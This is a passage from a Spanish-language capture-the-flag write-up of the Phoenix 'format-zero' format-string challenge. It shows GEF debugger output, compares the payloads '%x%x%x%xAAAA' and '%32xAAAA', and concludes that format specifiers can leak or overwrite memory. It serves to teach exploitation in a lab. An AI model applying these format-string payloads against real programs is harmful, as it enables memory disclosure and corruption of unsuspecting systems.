     0x4006fa <main+93>        mov    rsi, rdx
     0x4006fd <main+96>        mov    rdi, rax
     0x400700 <main+99>        mov    eax, 0x0
     0x400705 <main+104>       call   0x400500 <sprintf@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format-zero", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006f2 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Al continuar la ejecución con `c` vemos que el buffer ha sido sobreescrito con espacios (generados por `%32x`) seguidos de las `AAAA`, lo que provoca la modificación de la variable `changeme`

```csharp
gef➤  c
Continuing.

Breakpoint 2, 0x000000000040070a in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x25              
$rbx   : 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rcx   : 0x0               
$rdx   : 0xffffffff        
$rsp   : 0x00007fffffffe620  →  0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rbp   : 0x00007fffffffe670  →  0x0000000000000001
$rsi   : 0x00007fffffffe325  →  0x0000400380000000
$rdi   : 0x00007fffffffe665  →  0x0000000000000000
$rip   : 0x000000000040070a  →  <main+109> mov eax, DWORD PTR [rbp-0x10]
$r8    : 0x2000            
$r9    : 0x8               
$r10   : 0x0               
$r11   : 0x00007ffff7dfa2e7  →  "-+   0X0x"
$r12   : 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040069d  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe620│+0x0000: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"	 ← $rsp
0x00007fffffffe628│+0x0008: 0x0000000100000000
0x00007fffffffe630│+0x0010: "%32xAAAA"
0x00007fffffffe638│+0x0018: 0x000000000000000a
0x00007fffffffe640│+0x0020: "ffffe630AAAA"
0x00007fffffffe648│+0x0028: "ffffe630AAAA"
0x00007fffffffe650│+0x0030: "ffffe630AAAA"
0x00007fffffffe658│+0x0038: "ffffe630AAAA"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006fd <main+96>        mov    rdi, rax
     0x400700 <main+99>        mov    eax, 0x0
     0x400705 <main+104>       call   0x400500 <sprintf@plt>
 →   0x40070a <main+109>       mov    eax, DWORD PTR [rbp-0x10]
     0x40070d <main+112>       test   eax, eax
     0x40070f <main+114>       je     0x40071d <main+128>
     0x400711 <main+116>       mov    edi, 0x4007f8
     0x400716 <main+121>       call   0x4004e0 <puts@plt>
     0x40071b <main+126>       jmp    0x400727 <main+138>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format-zero", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40070a → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/8xg $rbp-0x30
0x7fffffffe640:	0x2020202020202020	0x2020202020202020
0x7fffffffe650:	0x2020202020202020	0x3033366566666666
0x7fffffffe660:	0x0000000a41414141	0x0000000000000000
0x7fffffffe670:	0x0000000000000001	0x00007ffff7d8fd62
gef➤ 
```

La diferencia entre los dos payloads está en la forma en que `printf` procesa la cadena de formato y lo que termina reflejando en la pila. Con `%x%x%x%xAAAA`, la función imprime y consume cuatro valores consecutivos, mostrando basura en hexadecimal antes de que aparezca `AAAA` al final. En cambio, `%32xAAAA` no avanza sobre varios argumentos, sino que toma un único valor y lo imprime en hexadecimal con un ancho de 32 caracteres, lo que introduce relleno de espacios en la salida antes de la secuencia `AAAA`

**Conclusión**

En este reto aprendimos cómo las funciones de formato, específicamente `printf`, pueden ser explotadas cuando reciben cadenas controladas por el usuario sin validar. A diferencia de un simple *buffer overflow*, aquí la manipulación proviene de los especificadores de formato que permiten leer o incluso escribir en memoria. Identificamos cómo distintos payloads producen resultados diferentes en la pila y comprendimos que el verdadero peligro radica en que esta vulnerabilidad puede usarse tanto para filtrar información sensible como para modificar valores críticos en la ejecución del programa.

Puntos clave:

- El uso inseguro de `printf` sin argumentos adicionales abre la puerta a vulnerabilidades de *format string*.
- Los especificadores de formato (`%x`, `%s`, `%n`, etc.) consumen o manipulan datos directamente desde la pila.
- Diferentes payloads muestran comportamientos distintos: `%x%x%x%xAAAA` consume múltiples argumentos, mientras `%32xAAAA` solo imprime un valor con relleno.
- Esta técnica puede emplearse para **leer memoria arbitraria** (información sensible) o **escribir en direcciones específicas** (ejecución arbitraria).